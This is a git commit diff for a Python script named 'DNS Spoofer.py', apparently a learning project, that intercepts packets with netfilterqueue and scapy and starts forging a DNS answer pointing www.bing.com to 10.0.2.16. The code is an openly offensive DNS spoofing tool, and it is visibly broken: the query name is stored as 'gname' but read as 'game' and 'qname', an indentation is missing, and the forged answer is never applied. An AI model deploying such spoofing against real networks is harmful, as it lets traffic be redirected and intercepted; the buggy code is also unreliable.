2c37680467b3ebda79cabde59551e137b9f961ca
Ross M <44169316+Scunnered@users.noreply.github.com>
2020-06-15 20:10:20 +0100

    Analysing & Creating a Custom DNS Response

--- DNS Spoofer.py
+++ DNS Spoofer.py
@@ -1,10 +1,18 @@
 #!/usr/bin/env python
 import netfilterqueue
-import scapy.all
+import scapy.all as scapy
+
 
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
-    print(scapy_packet.show())
+    if scapy_packet.haslayer(scapy.DNSRR):
+        gname = scapy_packet[scapy.DNSQR].qname
+        if "www.bing.com" in game:
+        print(" -/- Spoofing Target")
+        answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.16")
+
+
+
     packet.accept()
 
 queue = netfilterqueue.NetfilterQueue()
